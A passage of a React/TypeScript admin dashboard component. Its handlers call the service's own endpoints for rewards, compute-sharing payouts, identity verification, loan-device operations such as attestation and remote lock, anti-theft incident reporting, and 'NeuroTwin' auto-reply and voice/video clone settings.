        audience: "all",
      },
    });
    setNewOfferName("");
    setNewOfferPct("10");
    addNotification({ type: "success", message: "Offer created." });
  };

  const toggleFlag = async (k: string) => {
    await callAction("/admin/dashboard/flags/toggle", { key: k });
  };

  const addPlan = async () => {
    const name = window.prompt("Plan name:");
    if (!name) return;
    const monthly = Number(window.prompt("Monthly price:", "29"));
    const annual = Number(window.prompt("Annual price:", "290"));
    if (!Number.isFinite(monthly) || !Number.isFinite(annual)) return;
    await callAction("/admin/dashboard/plans/upsert", {
      plan: { name, monthly, annual, active: true, features: ["Custom Plan"] },
    });
    addNotification({ type: "success", message: `${name} plan added.` });
  };

  const exportData = (name: string, data: unknown) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${name}_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const toOutputText = (data: unknown) => (typeof data === "string" ? data : JSON.stringify(data, null, 2));

  const downloadText = (name: string, ext: string, mime: string, content: string) => {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${name}_${Date.now()}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const escapeHtml = (value: string) =>
    value
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");

  const exportOutputTxt = (name: string, data: unknown) => {
    downloadText(name, "txt", "text/plain;charset=utf-8", toOutputText(data));
  };

  const exportOutputWord = (name: string, data: unknown) => {
    const safe = escapeHtml(toOutputText(data));
    const docHtml = `<!doctype html><html><head><meta charset="utf-8"><title>${name}</title></head><body><pre>${safe}</pre></body></html>`;
    downloadText(name, "doc", "application/msword", docHtml);
  };

  const printOutputPdf = (title: string, data: unknown) => {
    const w = window.open("", "_blank", "width=1024,height=760");
    if (!w) {
      addNotification({ type: "error", message: "Popup blocked. Allow popups to print/export PDF." });
      return;
    }
    const safe = escapeHtml(toOutputText(data));
    w.document.write(
      `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title><style>body{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;padding:20px;}h1{font-family:system-ui,sans-serif;font-size:18px;}pre{white-space:pre-wrap;line-height:1.4;}</style></head><body><h1>${title}</h1><pre>${safe}</pre></body></html>`
    );
    w.document.close();
    w.focus();
    w.print();
  };

  const saveModelControl = async () => {
    await callAction("/admin/dashboard/model/save", { modelControl });
    addNotification({ type: "success", message: "Model control saved." });
  };

  const saveCryptoRewards = async () => {
    await callAction("/admin/dashboard/crypto/save", { cryptoRewards });
    addNotification({ type: "success", message: "Crypto rewards configuration saved." });
  };

  const saveRewardsConfig = async () => {
    await callAction("/admin/dashboard/rewards/config/save", { config: rewardsLedger.config });
    addNotification({ type: "success", message: "Rewards conversion config saved." });
  };

  const saveIdverseConfig = async () => {
    const payload = {
      idverse: {
        enabled: idverseConfig.enabled,
        baseUrl: idverseConfig.baseUrl.trim(),
        projectId: idverseConfig.projectId.trim(),
        timeoutMs: Number(idverseConfig.timeoutMs) || 12000,
        strictBiometric: idverseConfig.strictBiometric,
        strictLiveness: idverseConfig.strictLiveness,
        apiKey: idverseConfig.apiKey.trim() || idverseConfig.apiKeyMasked || "",
      },
    };
    const data = await callAction("/admin/dashboard/idverse/save", payload);
    if (data?.idverse) {
      setIdverseConfig((prev) => ({
        ...prev,
        ...data.idverse,
        apiKey: "",
      }));
      addNotification({ type: "success", message: "IDVerse configuration saved." });
    }
  };

  const checkIdverseStatus = async () => {
    try {
      const data = await getJson("/idverse/status");
      setIdverseStatus(data);
      addNotification({ type: "info", message: data?.healthy ? "IDVerse is healthy." : "IDVerse is not healthy." });
    } catch (err: any) {
      setIdverseStatus({ success: false, error: err?.message || String(err) });
      addNotification({ type: "error", message: err?.message || "IDVerse status check failed." });
    }
  };

  const runIdverseVerifySample = async () => {
    const data = await callAction("/neuroedge/verify-identity", {
      userId: "sample-user",
      docType: "passport",
      country: "UG",
      sessionId: `dash-${Date.now()}`,
    });
    if (data) setBackendOutput(data);
  };

  const creditPoints = async () => {
    const points = Number(rewardPointsInput || 0);
    if (!rewardUserId.trim() || points <= 0) {
      addNotification({ type: "error", message: "Enter user ID and positive points." });
      return;
    }
    await callAction("/admin/dashboard/rewards/wallets/credit", {
      userId: rewardUserId.trim(),
      userName: rewardUserName.trim() || "User",
      points,
    });
    addNotification({ type: "success", message: "Points credited." });
  };

  const debitPoints = async () => {
    const points = Number(rewardPointsInput || 0);
    if (!rewardUserId.trim() || points <= 0) {
      addNotification({ type: "error", message: "Enter user ID and positive points." });
      return;
    }
    await callAction("/admin/dashboard/rewards/wallets/debit", {
      userId: rewardUserId.trim(),
      points,
    });
    addNotification({ type: "success", message: "Points debited." });
  };

  const convertPoints = async (target: "cash" | "wdc") => {
    const points = Number(rewardPointsInput || 0);
    if (!rewardUserId.trim() || points <= 0) {
      addNotification({ type: "error", message: "Enter user ID and positive points." });
      return;
    }
    await callAction("/admin/dashboard/rewards/wallets/convert", {
      userId: rewardUserId.trim(),
      points,
      target,
    });
    addNotification({ type: "success", message: `Points converted to ${target.toUpperCase()} pending balance.` });
  };

  const refreshOwnerCompute = async () => {
    const data = await callAction("GET:/dashboard/compute-owner/bootstrap", {});
    if (data?.devices) setOwnerComputeDevices(data.devices);
    if (data?.guardrails && typeof data.guardrails === "object") {
      setOwnerGuardrails((p) => ({ ...p, ...data.guardrails }));
    }
    if (data?.payoutProfile) setOwnerPayoutProfile(data.payoutProfile);
    if (data?.payoutRequests) setOwnerPayoutRequests(data.payoutRequests);
    if (data?.wallet) setOwnerWallet(data.wallet);
  };

  const telemetryDraftFor = (device: OwnerComputeDevice) =>
    telemetryDraftByDevice[device.id] || {
      cpuPct: String(Number(device?.stats?.cpuPct || 0)),
      ramPct: String(Number(device?.stats?.ramPct || 0)),
      tempC: String(Number(device?.stats?.tempC || 0)),
      onBattery: Boolean(device?.stats?.onBattery || false),
    };

  const updateTelemetryDraft = (
    deviceId: string,
    next: Partial<{ cpuPct: string; ramPct: string; tempC: string; onBattery: boolean }>
  ) => {
    setTelemetryDraftByDevice((p) => ({
      ...p,
      [deviceId]: { ...((p[deviceId] as any) || {}), ...next } as any,
    }));
  };

  const upsertOwnerComputeDevice = async () => {
    if (!computeDeviceDraft.hostname.trim()) {
      addNotification({ type: "error", message: "Enter device hostname." });
      return;
    }
    await callAction("/dashboard/compute-owner/device/upsert", {
      device: {
        id: computeDeviceDraft.id.trim(),
        hostname: computeDeviceDraft.hostname.trim(),
        os: computeDeviceDraft.os,
      },
    });
    setComputeDeviceDraft({ id: "", hostname: "", os: "linux" });
    addNotification({ type: "success", message: "Device added/updated for compute sharing." });
    await refreshOwnerCompute();
  };

  const ownerDeviceAction = async (id: string, action: "pause" | "resume" | "suspend" | "delete") => {
    await callAction("/dashboard/compute-owner/device/action", { id, action });
    addNotification({ type: "success", message: `Device action completed: ${action}` });
    await refreshOwnerCompute();
  };

  const requestPaymentVerify = async () => {
    if (!otpDestination.trim()) {
      addNotification({
        type: "error",
        message: otpChannel === "sms" ? "Enter phone number for SMS verification." : "Enter email for verification.",
      });
      return;
    }
    const payload =
      otpChannel === "sms"
        ? { channel: "sms", phone: otpDestination.trim() }
        : { channel: "email", email: otpDestination.trim() };
    const data = await callAction("/dashboard/compute-owner/payment/request-verify", payload);
    if (data?.verification?.challengeId) {
      setPaymentVerifyChallengeId(String(data.verification.challengeId));
      addNotification({
        type: "info",
        message: `Verification code sent via ${String(data?.verification?.channel || otpChannel)} to ${String(
          data?.verification?.maskedDestination || "destination"
        )}`,
      });
    }
  };

  const submitDeviceTelemetry = async (device: OwnerComputeDevice) => {
    const draft = telemetryDraftFor(device);
    await callAction("/dashboard/compute-owner/device/telemetry", {
      id: device.id,
      stats: {
        cpuPct: Number(draft.cpuPct || 0),
        ramPct: Number(draft.ramPct || 0),
        tempC: Number(draft.tempC || 0),
        onBattery: Boolean(draft.onBattery),
      },
    });
    addNotification({ type: "success", message: `Telemetry submitted for ${device.hostname}.` });
    await refreshOwnerCompute();
  };

  const saveOwnerPaymentVerified = async () => {
    if (!paymentVerifyChallengeId || !paymentVerifyCode.trim()) {
      addNotification({ type: "error", message: "Request verification and enter code first." });
      return;
    }
    await callAction("/dashboard/compute-owner/payment/verify-save", {
      challengeId: paymentVerifyChallengeId,
      code: paymentVerifyCode.trim(),
      profile: ownerPaymentDraft,
    });
    setPaymentVerifyCode("");
    addNotification({ type: "success", message: "Payout details saved with verification." });
    await refreshOwnerCompute();
  };

  const requestOwnerPayout = async () => {
    const amountUsd = Number(payoutReqUsd || 0);
    const amountWdc = Number(payoutReqWdc || 0);
    const points = Number(payoutReqPoints || 0);
    if (amountUsd <= 0 && amountWdc <= 0 && points <= 0) {
      addNotification({ type: "error", message: "Enter payout amount in USD, WDC, or points." });
      return;
    }
    await callAction("/dashboard/compute-owner/payout/request", {
      target: payoutReqTarget,
      amountUsd,
      amountWdc,
      points,
    });
    addNotification({ type: "success", message: "Payout request submitted for founder/admin approval." });
    setPayoutReqUsd("0");
    setPayoutReqWdc("0");
    setPayoutReqPoints("0");
    await refreshOwnerCompute();
  };

  const refreshComputePayoutsAdmin = async () => {
    const data = await callAction("GET:/admin/dashboard/compute-payouts", {});
    if (data?.payoutBudget) setComputePayoutBudget((p) => ({ ...p, ...data.payoutBudget }));
    if (Array.isArray(data?.payoutRequests)) setComputePayoutRequestsAdmin(data.payoutRequests);
      if (data?.computeDonation?.autoPayoutConfig && typeof data.computeDonation.autoPayoutConfig === "object") {
        setComputeAutoPayoutConfig((p) => ({ ...p, ...data.computeDonation.autoPayoutConfig }));
      }
      if (data?.scheduler && typeof data.scheduler === "object") {
        setComputeAutoPayoutConfig((p) => ({ ...p, ...data.scheduler }));
      }
    if (data?.autoPayoutConfig && typeof data.autoPayoutConfig === "object") {
      setComputeAutoPayoutConfig((p) => ({ ...p, ...data.autoPayoutConfig }));
    }
  };

  const approveComputePayout = async (
    requestId: string,
    settlement: "scheduled" | "instant" | "bank" | "card" | "wdc" = "scheduled"
  ) => {
    await callAction("/admin/dashboard/compute-payouts/approve", { requestId, settlement });
    addNotification({
      type: "success",
      message: settlement === "instant" ? "Payout approved and sent." : "Payout approved for scheduler.",
    });
    await refreshComputePayoutsAdmin();
  };

  const rejectComputePayout = async (requestId: string) => {
    await callAction("/admin/dashboard/compute-payouts/reject", { requestId, reason: "manual review rejected" });
    addNotification({ type: "warn", message: "Payout request rejected." });
    await refreshComputePayoutsAdmin();
  };

  const saveComputeBudget = async () => {
    await callAction("/admin/dashboard/compute-payouts/budget/save", { budget: computePayoutBudget });
    addNotification({ type: "success", message: "Compute payout budget saved." });
    await refreshComputePayoutsAdmin();
  };

  const saveComputePayoutScheduler = async () => {
    await callAction("/admin/dashboard/compute-payouts/scheduler/save", {
      scheduler: computeAutoPayoutConfig,
    });
    addNotification({ type: "success", message: "Auto payout scheduler settings saved." });
    await refreshComputePayoutsAdmin();
  };

  const refreshLoanOps = async () => {
    if (!canAccessLoanOps) return;
    const data = await callAction("GET:/admin/loan-ops/bootstrap", {});
    if (data?.loanOps) {
      if (Array.isArray(data.loanOps.companies)) setLoanOpsCompanies(data.loanOps.companies);
      if (Array.isArray(data.loanOps.devices)) setLoanOpsDevices(data.loanOps.devices);
      if (Array.isArray(data.loanOps.apiKeys)) setLoanOpsApiKeys(data.loanOps.apiKeys);
      if (Array.isArray(data.loanOps.intakeLogs)) setLoanOpsIntakeLogs(data.loanOps.intakeLogs);
      if (Array.isArray(data.loanOps.disputes)) setLoanOpsDisputes(data.loanOps.disputes);
      if (data.loanOps.policy && typeof data.loanOps.policy === "object") {
        setLoanOpsPolicy((p) => ({
          ...p,
          ...data.loanOps.policy,
          allowedAttestationProvidersCsv: Array.isArray(data.loanOps.policy.allowedAttestationProviders)
            ? data.loanOps.policy.allowedAttestationProviders.join(",")
            : p.allowedAttestationProvidersCsv,
        }));
      }
    }
  };

  const upsertLoanCompany = async () => {
    if (!loanCompanyDraft.name.trim()) {
      addNotification({ type: "error", message: "Enter company name." });
      return;
    }
    await callAction("/admin/loan-ops/company/upsert", { company: loanCompanyDraft });
    addNotification({ type: "success", message: "Loan company saved." });
    setLoanCompanyDraft({ id: "", name: "", contactEmail: "", contactPhone: "", legalPolicyRef: "" });
    await refreshLoanOps();
  };

  const importLoanDevicesFromText = async () => {
    if (!loanDeviceDraft.companyId.trim() || !loanImportText.trim()) {
      addNotification({ type: "error", message: "Select company ID and paste device text." });
      return;
    }
    const data = await callAction("/admin/loan-ops/device/import-text", {
      companyId: loanDeviceDraft.companyId.trim(),
      text: loanImportText,
    });
    addNotification({ type: "success", message: `Imported ${Number(data?.imported || 0)} device record(s).` });
    setLoanImportText("");
    await refreshLoanOps();
  };

  const upsertLoanDevice = async () => {
    if (!loanDeviceDraft.companyId.trim() || !loanDeviceDraft.model.trim()) {
      addNotification({ type: "error", message: "Provide company ID and device model." });
      return;
    }
    await callAction("/admin/loan-ops/device/upsert", {
      device: {
        ...loanDeviceDraft,
      },
    });
    addNotification({ type: "success", message: "Loan device saved." });
    setLoanDeviceDraft((p) => ({ ...p, id: "", model: "", serial: "", imei: "", ownerRef: "" }));
    await refreshLoanOps();
  };

  const updateLoanStatus = async (deviceId: string, loanStatus: string, overdueDays = 0) => {
    await callAction("/admin/loan-ops/device/loan-status", { deviceId, loanStatus, overdueDays });
    addNotification({ type: "success", message: `Loan status updated: ${loanStatus}` });
    await refreshLoanOps();
  };

  const createLoanApiKey = async () => {
    if (!loanApiKeyCompanyId.trim()) {
      addNotification({ type: "error", message: "Enter company ID for API key." });
      return;
    }
    const data = await callAction("/admin/loan-ops/api-keys/create", {
      companyId: loanApiKeyCompanyId.trim(),
      name: loanApiKeyName.trim() || "LoanOps Integration Key",
    });
    if (data?.apiKey) setLatestGeneratedApiKey(String(data.apiKey));
    addNotification({ type: "success", message: "LoanOps API key generated." });
    await refreshLoanOps();
  };

  const revokeLoanApiKey = async (id: string) => {
    await callAction("/admin/loan-ops/api-keys/revoke", { id });
    addNotification({ type: "warn", message: "LoanOps API key revoked." });
    await refreshLoanOps();
  };

  const saveLoanIntegration = async () => {
    if (!loanApiKeyCompanyId.trim()) {
      addNotification({ type: "error", message: "Enter company ID first." });
      return;
    }
    await callAction("/admin/loan-ops/integration/upsert", {
      integration: {
        companyId: loanApiKeyCompanyId.trim(),
        systemName: "Existing Loan System",
        baseUrl: apiBase,
        webhookUrl: `${apiBase}/loan/webhook`,
        authMode: "api_key",
        status: "active",
        notes: "NeuroEdge plug-in integration",
      },
    });
    addNotification({ type: "success", message: "Loan integration saved." });
    await refreshLoanOps();
  };

  const saveLoanOpsPolicy = async () => {
    await callAction("/admin/loan-ops/policy/save", {
      policy: {
        ...loanOpsPolicy,
        allowedAttestationProviders: String(loanOpsPolicy.allowedAttestationProvidersCsv || "")
          .split(",")
          .map((x) => x.trim())
          .filter(Boolean),
      },
    });
    addNotification({ type: "success", message: "LoanOps policy saved." });
    await refreshLoanOps();
  };

  const reportLoanAttestation = async () => {
    if (!loanSelectedDeviceId.trim()) {
      addNotification({ type: "error", message: "Select a loan device ID first." });
      return;
    }
    await callAction("/admin/loan-ops/device/attestation/report", {
      deviceId: loanSelectedDeviceId.trim(),
      attestation: {
        provider: loanAttestationProvider,
        status: loanAttestationStatus,
      },
    });
    addNotification({ type: "success", message: "Attestation report recorded." });
    await refreshLoanOps();
  };

  const runLoanBootCheck = async () => {
    if (!loanSelectedDeviceId.trim()) {
      addNotification({ type: "error", message: "Select a loan device ID first." });
      return;
    }
    await callAction("/admin/loan-ops/device/boot-check", {
      deviceId: loanSelectedDeviceId.trim(),
      integrityOk: loanBootIntegrityOk,
    });
    addNotification({ type: "success", message: "Boot compliance check recorded." });
    await refreshLoanOps();
  };

  const triggerLoanLock = async (lock: boolean) => {
    if (!loanSelectedDeviceId.trim()) {
      addNotification({ type: "error", message: "Select a loan device ID first." });
      return;
    }
    await callAction("/admin/loan-ops/device/lock-trigger", {
      deviceId: loanSelectedDeviceId.trim(),
      lock,
      reason: lock ? "loan_policy_lock" : "manual_unlock",
    });
    addNotification({ type: "success", message: lock ? "Device lock requested." : "Device unlock requested." });
    await refreshLoanOps();
  };

  const markLoanReenrolled = async () => {
    if (!loanSelectedDeviceId.trim()) {
      addNotification({ type: "error", message: "Select a loan device ID first." });
      return;
    }
    await callAction("/admin/loan-ops/device/reenroll", { deviceId: loanSelectedDeviceId.trim() });
    addNotification({ type: "success", message: "Device re-enrollment marked as complete." });
    await refreshLoanOps();
  };

  const openLoanDispute = async () => {
    const device = loanOpsDevices.find((d) => d.id === loanSelectedDeviceId);
    if (!device) {
      addNotification({ type: "error", message: "Pick a valid loan device first." });
      return;
    }
    await callAction("/admin/loan-ops/dispute/open", {
      deviceId: device.id,
      companyId: device.companyId,
      reason: loanDisputeReason,
      evidenceRef: loanDisputeEvidenceRef.trim(),
    });
    addNotification({ type: "warn", message: "Loan dispute opened." });
    await refreshLoanOps();
  };

  const resolveLoanDispute = async (disputeId: string) => {
    await callAction("/admin/loan-ops/dispute/resolve", {
      disputeId,
      resolution: "manual_resolution",
    });
    addNotification({ type: "success", message: "Loan dispute resolved." });
    await refreshLoanOps();
  };

  const recordLoanLegalConsent = async () => {
    const device = loanOpsDevices.find((d) => d.id === loanSelectedDeviceId);
    if (!device || !loanConsentSubjectRef.trim() || !loanConsentType.trim()) {
      addNotification({ type: "error", message: "Select device and fill consent subject/type." });
      return;
    }
    await callAction("/admin/loan-ops/legal-consent/record", {
      companyId: device.companyId,
      subjectRef: loanConsentSubjectRef.trim(),
      consentType: loanConsentType.trim(),
      legalBasis: "contract",
      evidenceRef: loanDisputeEvidenceRef.trim(),
    });
    addNotification({ type: "success", message: "Legal consent recorded." });
    await refreshLoanOps();
  };

  const refreshUserProtection = async () => {
    const data = await callAction("GET:/dashboard/protection/bootstrap", {});
    if (data?.profile) setUserProtectionProfile(data.profile);
    if (Array.isArray(data?.incidents)) setUserProtectionIncidents(data.incidents);
    if (data?.policy) setUserProtectionPolicy(data.policy);
  };

  const upsertProtectedDevice = async () => {
    if (!userProtectDeviceDraft.label.trim()) {
      addNotification({ type: "error", message: "Enter protected device label." });
      return;
    }
    await callAction("/dashboard/protection/device/upsert", {
      device: {
        id: userProtectDeviceDraft.id.trim(),
        label: userProtectDeviceDraft.label.trim(),
        platform: userProtectDeviceDraft.platform,
      },
    });
    addNotification({ type: "success", message: "Protected device saved." });
    setUserProtectDeviceDraft({ id: "", label: "", platform: "android" });
    await refreshUserProtection();
  };

  const applyUserDeviceAction = async (id: string, action: "pause" | "resume" | "remove") => {
    await callAction("/dashboard/protection/device/action", { id, action });
    addNotification({ type: "success", message: `Device ${action} applied.` });
    await refreshUserProtection();
  };

  const saveTrustedContact = async () => {
    if (!trustedContactDraft.name.trim() || !trustedContactDraft.endpoint.trim()) {
      addNotification({ type: "error", message: "Enter trusted contact name and destination." });
      return;
    }
    await callAction("/dashboard/protection/trusted-contact/upsert", { contact: trustedContactDraft });
    addNotification({ type: "success", message: "Trusted contact saved." });
    setTrustedContactDraft({ name: "", endpoint: "", channel: "email" });
    await refreshUserProtection();
  };

  const saveUserProtectionSettings = async () => {
    await callAction("/dashboard/protection/settings/save", {
      antiTheftConsent: Boolean(userProtectionProfile?.antiTheftConsent),
      locationConsent: Boolean(userProtectionProfile?.locationConsent),
      cameraEvidenceConsent: Boolean(userProtectionProfile?.cameraEvidenceConsent),
    });
    addNotification({ type: "success", message: "Protection consent settings saved." });
    await refreshUserProtection();
  };

  const reportProtectionIncident = async () => {
    if (!incidentDraft.deviceId.trim()) {
      addNotification({ type: "error", message: "Select/report a device ID first." });
      return;
    }
    await callAction("/dashboard/protection/incident/report", {
      deviceId: incidentDraft.deviceId.trim(),
      eventType: "tamper_attempt",
      note: incidentDraft.note.trim(),
      cameraEvidenceRef: incidentDraft.cameraEvidenceRef.trim(),
      location:
        incidentDraft.lat.trim() && incidentDraft.lng.trim()
          ? { lat: Number(incidentDraft.lat), lng: Number(incidentDraft.lng) }
          : null,
    });
    addNotification({ type: "warn", message: "Incident reported and queued for trusted-contact fanout." });
    setIncidentDraft((p) => ({ ...p, note: "", cameraEvidenceRef: "", lat: "", lng: "" }));
    await refreshUserProtection();
  };

  const runTwinAction = async (path: string, body: any = {}) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await postJson(target, body);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Twin action completed." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Twin action failed: ${err?.message || err}` });
    }
  };

  const askTwin = async () => {
    const q = twinQuestion.trim();
    if (!q) {
      addNotification({ type: "warn", message: "Type a question for Twin first." });
      return;
    }
    await runTwinAction("/twin/ask", {
      question: q,
      uploaded_files: twinUploadedFiles,
      uploaded_zips: twinUploadedZips,
      zip_path: twinZipPath.trim(),
      include_scan: true,
      include_analyze: twinIncludeAnalyze,
      include_report: twinIncludeReport,
    });
  };

  const refreshTwinChannels = async () => {
    try {
      const data = await getJson("/neurotwin/channels/bootstrap");
      setTwinChannelsBootstrap(data);
      const mode = String(data?.availability?.mode || "active");
      setTwinAvailabilityMode(mode);
      setTwinOutput(data);
      addNotification({ type: "success", message: "NeuroTwin channels refreshed." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed to refresh channels: ${err?.message || err}` });
    }
  };

  const connectTwinChannel = async () => {
    if (!twinChannelDraft.handle.trim()) {
      addNotification({ type: "warn", message: "Enter channel handle first." });
      return;
    }
    try {
      const data = await postJson("/neurotwin/channels/connect", twinChannelDraft);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Channel connected." });
      await refreshTwinChannels();
    } catch (err: any) {
      addNotification({ type: "error", message: `Channel connect failed: ${err?.message || err}` });
    }
  };

  const setTwinAvailability = async () => {
    try {
      const data = await postJson("/neurotwin/availability", {
        mode: twinAvailabilityMode,
        notes: twinAvailabilityNotes,
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: "Twin availability updated." });
      await refreshTwinChannels();
    } catch (err: any) {
      addNotification({ type: "error", message: `Availability update failed: ${err?.message || err}` });
    }
  };

  const draftTwinAutoReply = async () => {
    try {
      const data = await postJson("/neurotwin/auto-reply/draft", {
        ...twinAutoEventDraft,
        requester_role: dashboardRole,
      });
      setTwinAutoReplyDraft(data?.draft || null);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Auto-reply draft generated." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Auto-reply draft failed: ${err?.message || err}` });
    }
  };

  const approveTwinAutoReply = async (action: "approve_send" | "reject") => {
    if (!twinAutoReplyDraft) {
      addNotification({ type: "warn", message: "Generate a draft first." });
      return;
    }
    try {
      const data = await postJson("/neurotwin/auto-reply/approve", {
        draft: twinAutoReplyDraft,
        approver: twinApprover || "owner",
        action,
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: action === "approve_send" ? "Draft approved." : "Draft rejected." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Draft approval failed: ${err?.message || err}` });
    }
  };

  const loadTwinAutoReplyLogs = async () => {
    try {
      const data = await getJson("/neurotwin/auto-reply/logs?limit=100");
      setTwinOutput(data);
      addNotification({ type: "success", message: "Auto-reply logs loaded." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed to load logs: ${err?.message || err}` });
    }
  };

  const loadTwinMarketMap = async () => {
    try {
      const data = await getJson("/neurotwin/market-map");
      setTwinMarketMap(data?.market_map || null);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Market capability map loaded." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed to load market map: ${err?.message || err}` });
    }
  };

  const sendTwinChannelTest = async () => {
    if (!twinSendChannelId.trim()) {
      addNotification({ type: "warn", message: "Choose a connected channel id first." });
      return;
    }
    try {
      const data = await postJson("/neurotwin/channels/send-test", {
        channel_id: twinSendChannelId.trim(),
        message: twinSendTestMessage.trim() || "NeuroEdge test message",
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: "Test dispatch requested." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Test dispatch failed: ${err?.message || err}` });
    }
  };

  const loadTwinCallAssistantConfig = async () => {
    try {
      const data = await getJson("/neurotwin/call-assistant/config");
      setTwinCallConfig(data?.config || null);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Call assistant config loaded." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed loading call config: ${err?.message || err}` });
    }
  };

  const saveTwinCallAssistantConfig = async () => {
    try {
      const data = await postJson("/neurotwin/call-assistant/config", twinCallConfig || {});
      setTwinCallConfig(data?.config || twinCallConfig);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Call assistant config saved." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed saving call config: ${err?.message || err}` });
    }
  };

  const loadTwinCloneCustomization = async () => {
    try {
      const data = await getJson("/neurotwin/clone/customization");
      const cfg = data?.customization || {};
      setTwinCloneCustomization(cfg);
      setTwinCloneVoiceJson(JSON.stringify(cfg.voice_assets || [], null, 2));
      setTwinCloneVideoJson(JSON.stringify(cfg.video_assets || [], null, 2));
      setTwinClonePresetsJson(JSON.stringify(cfg.persona_presets || [], null, 2));
      setTwinOutput(data);
      addNotification({ type: "success", message: "Clone customization loaded." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed loading clone customization: ${err?.message || err}` });
    }
  };

  const saveTwinCloneCustomization = async () => {
    try {
      const payload = {
        voice_assets: JSON.parse(twinCloneVoiceJson || "[]"),
        video_assets: JSON.parse(twinCloneVideoJson || "[]"),
        persona_presets: JSON.parse(twinClonePresetsJson || "[]"),
        active_voice_asset_id: String(twinCloneCustomization?.active_voice_asset_id || ""),
        active_video_asset_id: String(twinCloneCustomization?.active_video_asset_id || ""),
        active_persona_preset_id: String(twinCloneCustomization?.active_persona_preset_id || ""),
      };
      const data = await postJson("/neurotwin/clone/customization", payload);
      setTwinCloneCustomization(data?.customization || payload);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Clone customization saved." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Failed saving clone customization: ${err?.message || err}` });
    }
  };

  const refreshMobileTwinBridge = async () => {
    try {
      const data = await getJson("/dashboard/twin/mobile/bootstrap");
      const section = data?.mobileTwinBridge || null;
      setMobileTwinBridge(section);
      if (section?.devices?.length) {
        const first = section.devices[0];
        if (!mobileTwinSyncDraft.deviceId) {
          setMobileTwinSyncDraft((p) => ({ ...p, deviceId: String(first.id || "") }));
        }
        if (!mobileTwinActionDraft.deviceId) {
          setMobileTwinActionDraft((p) => ({ ...p, deviceId: String(first.id || "") }));
        }
      }
      setTwinOutput(data);
      addNotification({ type: "success", message: "Mobile Twin bridge refreshed." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Mobile bridge refresh failed: ${err?.message || err}` });
    }
  };

  const registerMobileTwinDevice = async () => {
    try {
      const data = await postJson("/dashboard/twin/mobile/device/register", {
        device: {
          ...mobileTwinDeviceDraft,
          permissions: {
            call_screening: true,
            microphone: true,
            notifications: true,
          },
          capabilities: {
            call_assist: true,
            voip_answer: true,
            whatsapp_call_assist: true,
            video_avatar: true,
          },
        },
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: "Mobile twin device registered." });
      await refreshMobileTwinBridge();
    } catch (err: any) {
      addNotification({ type: "error", message: `Device register failed: ${err?.message || err}` });
    }
  };

  const syncMobileTwinDevice = async () => {
    if (!mobileTwinSyncDraft.deviceId.trim()) {
      addNotification({ type: "warn", message: "Choose a device ID to sync first." });
      return;
    }
    try {
      const data = await postJson("/dashboard/twin/mobile/device/sync", {
        deviceId: mobileTwinSyncDraft.deviceId.trim(),
        pushToken: mobileTwinSyncDraft.pushToken.trim(),
        attestationStatus: mobileTwinDeviceDraft.attestationStatus,
        permissions: {
          call_screening: Boolean(mobileTwinSyncDraft.permissionCallScreening),
          microphone: true,
          notifications: true,
        },
        capabilities: {
          call_assist: Boolean(mobileTwinSyncDraft.capabilityCallAssist),
          voip_answer: Boolean(mobileTwinSyncDraft.capabilityVoipAnswer),
          whatsapp_call_assist: Boolean(mobileTwinSyncDraft.capabilityWhatsappCallAssist),
          video_avatar: Boolean(mobileTwinSyncDraft.capabilityVideoAvatar),
        },
        status: mobileTwinSyncDraft.status,
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: "Mobile twin device synced." });
      await refreshMobileTwinBridge();
    } catch (err: any) {
      addNotification({ type: "error", message: `Device sync failed: ${err?.message || err}` });
    }
  };

  const enqueueMobileTwinAction = async () => {
    if (!mobileTwinActionDraft.deviceId.trim()) {
      addNotification({ type: "warn", message: "Choose a device ID first." });
      return;
    }
    try {
      const data = await postJson("/dashboard/twin/mobile/action/enqueue", {
        deviceId: mobileTwinActionDraft.deviceId.trim(),
        actionType: mobileTwinActionDraft.actionType,
        payload: JSON.parse(mobileTwinActionDraft.payloadJson || "{}"),
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: "Action enqueued to mobile app." });
      await refreshMobileTwinBridge();
    } catch (err: any) {
      addNotification({ type: "error", message: `Action enqueue failed: ${err?.message || err}` });
    }
  };

  const loadMobileTwinPending = async () => {
    if (!mobileTwinPendingDeviceId.trim()) {
      addNotification({ type: "warn", message: "Enter device ID first." });
      return;
    }
    try {
      const data = await getJson(`/dashboard/twin/mobile/actions/pending?deviceId=${encodeURIComponent(mobileTwinPendingDeviceId.trim())}`);
      setMobileTwinPendingActions(Array.isArray(data?.actions) ? data.actions : []);
